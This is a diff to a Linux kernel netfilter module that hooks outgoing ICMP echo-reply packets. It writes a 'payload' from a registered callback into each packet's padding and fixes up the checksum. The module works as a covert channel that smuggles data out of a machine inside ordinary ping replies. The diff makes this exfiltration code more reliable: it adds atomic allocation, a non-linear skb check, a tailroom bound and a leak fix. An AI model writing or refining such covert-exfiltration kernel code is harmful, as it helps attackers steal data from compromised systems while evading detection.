@@ -39,13 +39,13 @@ static inline void *skb_put_data_impl(struct sk_buff *skb, const void *data, uns
 unsigned int nf_sendfile_hook(void *priv,
                               struct sk_buff *skb,
                               const struct nf_hook_state *state)
-{
+{    
     if (NULL == g_get_payload_func) {
         // as long as we don't have a way to get our payloads, we don't 
         // have much to do.
         return NF_ACCEPT;
     }
-
+    
     struct iphdr *ip_layer = ip_hdr(skb);
     if (IPPROTO_ICMP != ip_layer->protocol) {
         // ignore any non-ICMP packets.
@@ -57,18 +57,24 @@ unsigned int nf_sendfile_hook(void *priv,
         // ignore any non-ICMP-echoreply packets.
         return NF_ACCEPT;
     }
-    
+
+    if (skb_is_nonlinear(skb)) {
+        // non-linear skb may trigger paging - prohibited since we can be called in interrupt context.
+        return NF_ACCEPT;
+    }
+
+    size_t payload_size = 0;
     size_t default_payload_size = get_default_payload_chunk_size();
-    size_t actual_payload_size = 0;
-    char* payload_data = (char*)kmalloc(default_payload_size, GFP_KERNEL);
+
+    char* payload_data = (char*)kmalloc(default_payload_size, GFP_ATOMIC);
     if (NULL == payload_data) {
         return NF_ACCEPT;
     }
 
     // get the payload we wish to send. payload_data acts as an output 
     // parameter to which g_get_payload_func copies the payload.
-    if (g_get_payload_func(payload_data, &actual_payload_size)) {
-        return NF_ACCEPT;
+    if (g_get_payload_func(payload_data, &payload_size)) {
+        goto clean_payload_data;
     }
 
     // since we want our payload to be in the packet's padding, we want to 
@@ -79,10 +85,13 @@ unsigned int nf_sendfile_hook(void *priv,
 
     // min(default_payload_size, actual_payload_size) as there might be a 
     // case that the payload is smaller than the default chunk size.
-    skb_put_data_impl(skb, payload_data, min(default_payload_size, actual_payload_size));
-
+    skb_put_data_impl(skb, payload_data, min(skb->end - skb->tail, payload_size));
+    
     icmp_layer->checksum = 0;
     icmp_layer->checksum = icmp_csum((const void *)icmp_layer, icmp_and_up_size);
+
+clean_payload_data:
+    kfree(payload_data);
 
     return NF_ACCEPT;
 }
